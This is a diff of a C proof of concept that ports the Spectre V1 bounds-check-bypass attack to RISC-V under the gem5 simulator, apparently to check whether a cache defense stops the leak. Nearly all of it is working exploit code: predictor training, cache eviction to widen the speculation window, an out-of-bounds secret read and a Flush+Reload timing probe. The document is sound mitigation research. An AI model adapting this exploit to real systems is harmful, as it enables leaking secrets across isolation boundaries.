@@ -1,98 +1,100 @@
 /*
- * Spectre V1 (bounds-check bypass) against the L1 data cache, for gem5 SE mode.
+ * Spectre V1 (bounds-check bypass / out-of-bounds speculation), SE mode.
  *
- * Purpose
- * -------
- * flop_attack and flop_attack_v2 close the leak using the Load Value Predictor:
- * the branch on a loaded value is resolved from a prediction, so the CPU
- * proceeds past a data dependency it has not yet satisfied.
+ * A port of the canonical Spectre V1 demonstration to RISC-V, keeping its
+ * structure:
  *
- * This attack does not use the LVP at all.  It relies only on the ordinary
- * branch predictor mispredicting a secret-dependent bounds check, which is the
- * original Spectre V1.  That makes it the control that matters for two reasons:
+ *     int fetch_function(size_t idx) {
+ *         if (idx < arr1_size)
+ *             return arr2[arr1[idx] * 512];
+ *         return -1;
+ *     }
  *
- *   1. It separates the cache mechanism from the predictor.  If SpaceSpec closes
- *      this leak too, then what protects the cache is the cache mechanism, and
- *      not some interaction with the LVP.
+ * with a small "public" table (arr1), a large "private" table (arr2), and a
+ * secret string as the attacker's goal.  The attacker picks an index such that
+ * &arr1[target_idx] lands on the secret, so the out-of-bounds read yields
+ * secret bytes; each byte then forms an address into arr2.  Probing arr2
+ * recovers the byte.
  *
- *   2. It is the case SafeSpec is actually about.  The leaking load belongs to
- *      an instruction that is squashed, because the branch it depends on was
- *      mispredicted.  Wait-for-commit means a squashed load's line is discarded
- *      rather than installed, so the secret-indexed line never becomes resident
- *      and there is nothing for a Flush+Reload probe to find.
+ * The two-level indirection is the point and is not incidental: the first load
+ * leaks the secret, the second turns it into a cache footprint.  A version that
+ * computes an address straight from a secret value tests something weaker.
  *
- * The attack
- * ----------
- *   probe_area   256 lines, in L1 throughout.  This is the array the attacker
- *                probes and the victim's array at the same time.
- *   victim(i)    a bounds check on a secret i, then probe_area[i * LINE_SIZE].
+ * Creating the window, portably
+ * ----------------------------
+ * The original uses _mm_clflush(&arr1_size): it evicts the bounds variable and
+ * nothing else, so the branch takes memory latency to resolve while the body's
+ * loads -- whose addresses are ready immediately -- issue long before.  Without
+ * that asymmetry the branch resolves first, the body is squashed before the
+ * dependent load can issue, and nothing is fetched to observe.
  *
- * The branch predictor is trained to expect "in bounds".  The attacker then
- * supplies an out-of-bounds secret, the predictor is wrong, and the load runs
- * and is then squashed.  Crucially the memory access has already happened by the
- * time the squash occurs, so the line is fetched -- it is only the instruction
- * that dies.
+ * gem5's RISC-V has no usable targeted flush: cbo.inval requires senvcfg.cbie
+ * and Zicbom is not in the default ISA, and clflush is x86.  So this port
+ * reproduces the same asymmetry the only way available -- evict the whole cache,
+ * then re-warm everything except the bounds variable:
  *
- * Pass condition
- * --------------
- * Not output equivalence.  The signal is a timing measurement, so the correct
- * comparison is between configurations:
+ *     evict_all()      touch a buffer larger than L1
+ *     warm_secret()    touch the secret, so the out-of-bounds read is an L1 hit
+ *     -> bounds_line is still cold, so the victim's branch is slow
+ *     -> the out-of-bounds read is hot, so its result is available immediately
  *
- *   LVP off, SpaceSpec off   expect LEAK      (branch predictor alone suffices)
- *   LVP off, SpaceSpec on    expect NO-LEAK   (this is the claim under test)
- *   LVP on,  SpaceSpec off   expect LEAK      (sanity: flop_attack still works)
+ * That is semantically what flushing a single variable does.  It is a
+ * substitution for the intrinsic, not a translation of it.
  *
- * "rec" is the recovered string.  A run where every round is '?' is a closed
- * leak; a run that spells the secret is an open one.
+ * This uses no Load Value Prediction.  The only speculation is the branch
+ * predictor mispredicting the bounds check, which is the original Spectre V1.
+ *
+ * Pass condition is not output equivalence -- the signal is a timing
+ * measurement, so it cannot be expressed as a diff.  The pass condition is that
+ * the top-scored candidate matches the secret byte when unprotected and does
+ * not when protected:
+ *
+ *   stock cache,  LVP off   expect LEAK
+ *   SpaceSpec on, LVP off   expect NO-LEAK
+ *   DIVERT=0,       LVP off expect LEAK   (control: the divert is load-bearing)
  */
 
 #include <stdint.h>
 #include <stdio.h>
 #include <string.h>
 
-#define LINE_SIZE    64
-#define PROBE_SIZE   (256 * LINE_SIZE)
-#define TRAIN_ITERS  4000
-#define THRESHOLD    40
-#define FLUSH_BUF_SIZE (192 * 1024)
+#define ARR1_SIZE      16
+#define ARR2_STRIDE    512
+#define NUM_PROBES     256
+
+#define TRAIN_ITERS    40
+#define NUM_TRIES      6
+#define CACHE_HIT_THRESHOLD 40
 
 /*
- * The victim will only ever be called with in-bounds values during training, so
- * the predictor learns "in bounds".  The attack index is well outside this.
+ * The victim reads the table out of bounds, so the table and the secret need a
+ * known, large gap between them.  A struct guarantees the layout; separate
+ * globals would depend on linker ordering, and if the secret happened to land
+ * within ARR1_SIZE of the table the attack would silently stop working.
  */
-#define VICTIM_BOUNDS 64
+struct __attribute__((aligned(64))) region_s {
+    uint8_t table[160];
+    uint8_t pad[4032];
+    char goal[24];
+};
 
-/* The secret the attacker wants: which line the victim speculatively touches. */
-#define SECRET 0xEE
-
-/* Shared with the victim; volatile so the compiler cannot constant-fold it. */
-static volatile uint32_t idx_var;
-
-/* The attacker-observable region. Also the victim's out-of-bounds target. */
-static uint8_t probe_area[PROBE_SIZE];
-
-/* Touched to evict L1 between rounds. */
-static uint8_t flush_buf[FLUSH_BUF_SIZE];
+static struct region_s region;
 
 /*
- * A chain of dependent loads used to delay the resolution of the bounds check.
- *
- * This is what makes the attack work at all, and getting it wrong is the whole
- * difficulty.  The bounds condition and the leaked address must not depend on
- * the same value: if they do, the branch resolves and the leaked load becomes
- * addressable at about the same moment, and the branch usually wins the race,
- * so the load never issues and nothing leaks.
- *
- * flop_attack escapes this only because the LVP supplies the secret-derived
- * value instantly, which is why it does not leak once the LVP is disabled.
- *
- * Here the bounds condition is a walk down a pointer chain -- CHAIN_LEN
- * dependent L1 hits, hundreds of cycles -- while the leaked address depends
- * only on a parameter that is ready on arrival.  The load therefore issues long
- * before the CPU learns which way the branch went.
+ * The bounds limit, alone on its own cache line, and never re-warmed.  Its being
+ * cold is what delays the branch.  This is the object _mm_clflush would target.
  */
-#define CHAIN_LEN 64
-static uint32_t chain[256];
+static volatile uint64_t __attribute__((aligned(64))) bounds_line[8];
+
+#define ARR1_SIZE_SLOT 0
+
+/* The private table the attacker probes.  Larger than L1 so it can be evicted. */
+static uint8_t arr2[NUM_PROBES * ARR2_STRIDE];
+
+/* Swept to evict the data cache.  Larger than any L1 this runs on. */
+static uint8_t evict_buf[128 * 1024];
+
+static volatile uint32_t sink;
 
 static inline uint64_t
 rdcycle(void)
@@ -102,114 +104,178 @@ rdcycle(void)
     return c;
 }
 
+/*
+ * Evict the data cache by sweeping a buffer larger than it.
+ *
+ * Read-only on purpose.  An earlier version accumulated into a global here,
+ * which dirtied every line it touched and turned each eviction into a
+ * writeback; at ~1000 calls that dominated the runtime.  Summing into a local
+ * and storing once keeps every line clean, so eviction is just a tag update.
+ */
 static void
-flush_all_l1(void)
+evict_all(void)
 {
-    volatile uint8_t *fb = flush_buf;
-    for (int i = 0; i < FLUSH_BUF_SIZE; i += LINE_SIZE) {
-        fb[i] += 1;
+    const uint8_t *p = evict_buf;
+    uint64_t acc = 0;
+    for (size_t i = 0; i < sizeof(evict_buf); i += 64) {
+        acc += p[i];
+    }
+    sink += acc;
+}
+
+/*
+ * Re-warm the secret, and only the secret.
+ *
+ * This is what makes the body fast while the branch stays slow.  The
+ * out-of-bounds read must be an L1 hit so that its result -- a secret byte --
+ * is available almost immediately, giving arr2[that * STRIDE] a chance to issue
+ * long before the bounds check resolves.  bounds_line is deliberately left cold.
+ */
+static void
+warm_secret(void)
+{
+    const volatile char *s = region.goal;
+    for (int i = 0; i < 16; i++) {
+        sink += (uint32_t)s[i];
     }
 }
 
 /*
- * The victim.
+ * The victim.  Deliberately noinline with nothing compile-time constant.
  *
- * Deliberately noinline, and nothing here is compile-time constant.  The branch
- * is a bounds check whose condition is secret-dependent; the body performs a
- * load whose address is also secret-dependent.  The predictor is trained to
- * expect the bounds check to pass.
+ * Both array reads go through volatile pointers, and that is load-bearing
+ * rather than decoration.  Neither read has a side effect, so if the caller
+ * discards the result the compiler deletes the whole body: at -O2 an earlier
+ * version of this function collapsed to a single load of bounds_line and a ret,
+ * leaving no attack at all.  An attack whose leaking loads have been optimised
+ * away reports "no leak" for the uninteresting reason that it never accessed
+ * anything.  The call site also folds the result into a volatile sink, so the
+ * value is required as well as the loads.
  */
 __attribute__((noinline))
-static void
-victim(uint32_t secret)
+static int
+fetch_function(size_t idx)
 {
-    /* Slow to resolve, and does not depend on the secret. */
-    uint32_t c = 0;
-    for (int k = 0; k < CHAIN_LEN; k++) {
-        c = chain[c];
-    }
+    /* Cold load: costs memory latency, and does not depend on idx. */
+    size_t lim = bounds_line[ARR1_SIZE_SLOT];
 
-    if (c < VICTIM_BOUNDS) {
-        /* Fast to issue: the address is ready before the branch resolves. */
-        uint8_t v = probe_area[(size_t)secret * LINE_SIZE];
-        /* Consume the value so the access cannot be eliminated. */
-        if (v == 0xFF) {
-            idx_var = v;
-        }
+    if (idx < lim) {
+        const volatile uint8_t *pub = region.table;
+        volatile uint8_t *priv = arr2;
+        /* Out of bounds when idx == target: reads the secret string. */
+        uint8_t b = pub[idx];
+        /* Secret byte becomes an address into the private table. */
+        return priv[(size_t)b * ARR2_STRIDE];
     }
+    return -1;
 }
 
 int
 main(void)
 {
-    printf("spectre_v1 start  (secret line=%d, bounds=%d)\n",
-           SECRET, VICTIM_BOUNDS);
+    /* Deterministic "public" table; the values are irrelevant to the attack. */
+    static const uint8_t init[ARR1_SIZE] =
+        {16, 93, 45, 96, 4, 8, 41, 203, 15, 49, 56, 59, 62, 97, 112, 186};
+    memcpy(region.table, init, sizeof(init));
+    memcpy(region.goal, "PODA KUTTA!", 12);
 
-    for (int i = 0; i < 256; i++) {
-        probe_area[i * LINE_SIZE] = (uint8_t)i;
-        chain[i] = i;
+    bounds_line[ARR1_SIZE_SLOT] = ARR1_SIZE;
+
+    for (size_t i = 0; i < sizeof(arr2); i++) {
+        arr2[i] = 1;   /* fault the pages in rather than relying on CoW zeros */
     }
 
-    char recovered[8];
-    int hits = 0;
+    /*
+     * The index whose &table[idx] lands on the secret.  Guaranteed out of
+     * bounds because of the padding in `region`.  It advances by one per round
+     * so each round attacks the next secret byte; leaving it fixed would have
+     * every round read goal[0] while expecting a different byte.
+     */
+    size_t target = (size_t)(region.goal - (char *)region.table);
 
-    for (int round = 0; round < 4; round++) {
-        /*
-         * Train: the chain lands on 0, which is in bounds, so the predictor
-         * learns that the bounds check passes.
-         */
-        chain[0] = 0;
-        for (int i = 0; i < TRAIN_ITERS; i++) {
-            victim(round);
-        }
+    printf("spectre_v1 start  target=%d (bounds=%d)  secret=\"%s\"\n",
+           (int)target, ARR1_SIZE, region.goal);
+    fflush(stdout);
 
-        /*
-         * Attack: the chain now lands outside the bounds, so the check really
-         * does fail, but the predictor still expects it to pass.
-         */
-        chain[0] = 0xC8;    /* 200, out of bounds */
-        chain[0xC8] = 0xC8; /* and it stays there */
+    char recovered[7];
+    int correct = 0;
 
-        /* Evict probe_area from L1 so a later hit is attributable. */
-        flush_all_l1();
+    for (int round = 0; round < 6; round++) {
+        uint8_t want = (uint8_t)region.goal[round];
+        size_t round_target = target + round;
 
-        /* The mispredicted load brings probe_area[SECRET*64] into L1. */
-        victim(SECRET);
+        /* hits[b] counts tries in which probe b looked like an L1 hit. */
+        static int hits[NUM_PROBES];
+        memset(hits, 0, sizeof(hits));
 
-        /* Restore, so the next round trains from a known state. */
-        chain[0] = 0;
+        for (int tries = 0; tries < NUM_TRIES; tries++) {
+            /* An in-bounds index, to train the predictor towards "not taken". */
+            size_t train_idx = tries % ARR1_SIZE;
 
-        /*
-         * Flush+Reload: whichever line is now fastest in L1 is the one the
-         * victim speculatively touched.
-         */
-        uint64_t min_lat = ~0ULL;
-        int leak = -1;
-        for (int b = 0; b < 256; b++) {
-            volatile uint8_t *line = probe_area + b * LINE_SIZE;
-            uint64_t c1 = rdcycle();
-            uint8_t v = *line;
-            asm volatile("" : "+r"(v) : : "memory");
-            uint64_t c2 = rdcycle();
-            uint64_t d = c2 - c1;
-            if (d < min_lat) {
-                min_lat = d;
-                leak = b;
+            /*
+             * Train on an unbroken run of in-bounds calls, then attack once.
+             *
+             * Interleaving the attack into the training loop, as the original
+             * does with its ATTACK_LEAP stride, makes the branch outcome a
+             * short periodic pattern.  gem5's TAGE has enough history to learn
+             * a period-12 loop and then predicts the attack iteration correctly,
+             * so nothing is ever mispredicted and there is nothing to observe.
+             * A long run of one outcome followed by a single exception is the
+             * case branch predictors are actually bad at, which is what makes
+             * the attack work here.
+             */
+            for (int i = 0; i < TRAIN_ITERS; i++) {
+                evict_all();
+                warm_secret();
+                /* Consume the result, or the victim's loads are dead code. */
+                sink += (uint32_t)fetch_function(train_idx);
+            }
+
+            /* The attack: exactly one out-of-bounds call. */
+            evict_all();
+            warm_secret();
+            sink += (uint32_t)fetch_function(round_target);
+
+            /*
+             * Probe.  Each candidate is a distinct cache line because of the
+             * 512-byte stride.  The secret's line arrived from the fill that
+             * the squashed load triggered.
+             */
+            for (int b = 0; b < NUM_PROBES; b++) {
+                volatile uint8_t *addr = &arr2[(size_t)b * ARR2_STRIDE];
+                uint64_t c1 = rdcycle();
+                uint8_t v = *addr;
+                asm volatile("" : "+r"(v) : : "memory");
+                uint64_t d = rdcycle() - c1;
+                if (d <= CACHE_HIT_THRESHOLD) {
+                    hits[b]++;
+                }
             }
         }
 
-        int got = (min_lat < THRESHOLD && leak == SECRET);
-        hits += got;
-        recovered[round] = got ? (char)leak : '?';
+        /* Highest score wins; the threshold keeps noise from being reported. */
+        int best = 0;
+        for (int b = 1; b < NUM_PROBES; b++) {
+            if (hits[b] > hits[best]) {
+                best = b;
+            }
+        }
 
-        printf("round %d: secret=0x%02x leaked=0x%02x min_lat=%llu  [%s]\n",
-               round, SECRET, (leak >= 0) ? leak : 0,
-               (unsigned long long)min_lat,
-               got ? "LEAK" : "NO-LEAK");
+        int got = (hits[best] > NUM_TRIES / 2);
+        recovered[round] = got ? (char)best : '?';
+        correct += got && (best == want);
+
+        printf("round %2d: want=0x%02x('%c')  got=0x%02x('%c')  "
+               "score=%d/%d  [%s]\n",
+               round, want, (want >= 32 && want < 127) ? want : '.',
+               best, (best >= 32 && best < 127) ? best : '.',
+               hits[best], NUM_TRIES, got ? "LEAK" : "NO-LEAK");
+        fflush(stdout);
     }
 
-    printf("spectre_v1 rec \"%s\"  hits=%d/4  verdict=%s\n",
-           recovered, hits, hits ? "LEAK" : "NO-LEAK");
+    recovered[6] = '\0';
+    printf("spectre_v1 rec \"%s\"  correct=%d/6  want=\"%s\"  verdict=%s\n",
+           recovered, correct, region.goal, correct >= 3 ? "LEAK" : "NO-LEAK");
 
     return 0;
 }
